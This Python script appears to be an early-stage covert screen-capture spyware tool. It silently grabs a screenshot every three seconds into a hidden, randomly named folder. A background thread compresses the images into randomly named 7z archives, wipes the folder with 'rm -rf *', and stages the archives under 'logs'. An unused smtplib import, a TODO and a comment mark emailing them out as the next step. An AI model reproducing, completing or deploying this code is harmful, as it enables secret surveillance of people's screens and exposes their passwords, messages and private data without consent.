import pyscreenshot as imagegrab
import time
import platform
from zipfile import ZipFile
import os
import random
import string
import threading
import smtplib
import subprocess
import py7zr

images = []

folder_name = ''

k = 10 #limit for now
file_name = "screenshot{i}.png"

def os_type():
    """
    Depending on the system i might do things differently
    """
    return platform.system()


def image_paths(directory):
    """
    Get root paths of wanted recources, in this case it's the root path of all screenshots taken.
    :the paths of the files will be stored in the file_parth list
    """
    file_path_list = [] #store list of file root paths

    for root, directory, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            file_path_list.append(file_path)

    return file_path_list

def zip_files(folder_name):
    """
    This will compress the screenshots folder with 7z
    """
    screenzip = random_word(7) + '.7z'

    with py7zr.SevenZipFile(screenzip, 'w') as archive:
        archive.writeall(folder_name, 'base')
    return screenzip

def random_word(length):
    """
    Generate random string, this is for creating randomly named files and folders
    """
    letters = string.ascii_lowercase
    word = []
    for i in range(length):
        word.append(letters[random.randint(1,25)])
    return("".join(word))

folder_name = "." + random_word(5) + '/' #folder
subprocess.run(['mkdir', folder_name])

def report():
    """
    This function will be a thread, compresses the screenshots and saves it to disk
    TODO send email and cleanup and accept parameters for some the stuff
    """
    zipped = zip_files(folder_name)
    os.system(f"cd {folder_name} && rm -rf *")
    subprocess.run(['mv', zipped,'logs']) # send this attachment by mail
    timer = threading.Timer(10, report)
    timer.start()

report()
i = 0
while True:
    screenshot = imagegrab.grab()
    screenshot.save(folder_name + file_name.format(i = i))
    i+= 1
    time.sleep(3)

